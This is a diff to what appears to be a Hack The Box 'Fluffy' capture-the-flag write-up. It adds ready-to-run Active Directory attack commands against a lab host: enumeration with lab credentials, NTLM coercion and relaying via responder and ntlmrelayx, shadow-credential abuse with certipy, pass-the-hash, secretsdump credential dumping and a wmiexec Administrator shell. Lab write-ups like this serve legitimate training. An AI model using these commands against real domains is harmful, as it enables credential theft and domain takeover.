@@ -112,17 +112,76 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 AD Recon</b></summary>
 
-- `nxc ldap/smb/winrm against fluffy.htb`
-- `certipy-ad find for ADCS templates and CA configuration`
-- `BloodHound collection and relationship review`
-- `CVE-2025-24071/library-ms coercion workflow`
-- `certipy shadow / account update flow around ca_svc`
-- `secretsdump/wmiexec with recovered Administrator hash`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.232.88
+nxc smb 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
+nxc ldap 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --users
+nxc ldap 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --groups
+```
 
 </details>
+
+<details open>
+<summary><b>📜 ADCS / BloodHound Enumeration</b></summary>
+
+```bash
+certipy-ad find -u 'j.fleischman@fluffy.htb' \
+  -p 'J0elTHEM4n1990!' \
+  -dc-ip 10.129.232.88 \
+  -stdout
+
+nxc ldap 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' \
+  --bloodhound --collection All --dns-server 10.129.232.88
+```
+
+</details>
+
+<details open>
+<summary><b>🪝 NTLM Coercion / Writable Share Lead</b></summary>
+
+```bash
+# Listener / capture side
+sudo responder -I tun0 -A
+sudo impacket-ntlmrelayx -t ldap://10.129.232.88 --dump --no-smb2support
+
+# Payload/share side: library-ms or ZIP coercion concept against writable IT share
+smbclient //10.129.232.88/IT -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' -c 'put payload.library-ms'
+```
+
+</details>
+
+<details open>
+<summary><b>🔐 Service Account Pivoting</b></summary>
+
+```bash
+# Validate recovered/derived accounts
+nxc smb 10.129.232.88 -u p.agila -p 'prometheusx-303'
+nxc winrm 10.129.232.88 -u winrm_svc -H '<winrm_svc-ntlm>'
+nxc smb 10.129.232.88 -u ca_svc -H '<ca_svc-ntlm>'
+```
+
+</details>
+
+<details open>
+<summary><b>👑 ADCS ESC16 / Shadow Credentials</b></summary>
+
+```bash
+# Technique shape: manipulate certificate identity path and authenticate with cert material
+certipy-ad shadow auto -u 'ca_svc@fluffy.htb' \
+  -hashes ':<ca_svc-ntlm>' \
+  -account ca_svc \
+  -dc-ip 10.129.232.88
+
+# Recover privileged material and use it
+impacket-secretsdump fluffy.htb/administrator@10.129.232.88 -hashes '<lm>:<ntlm>'
+impacket-wmiexec fluffy.htb/administrator@10.129.232.88 -hashes '<lm>:<ntlm>'
+```
+
+</details>
+
 
 ---
 
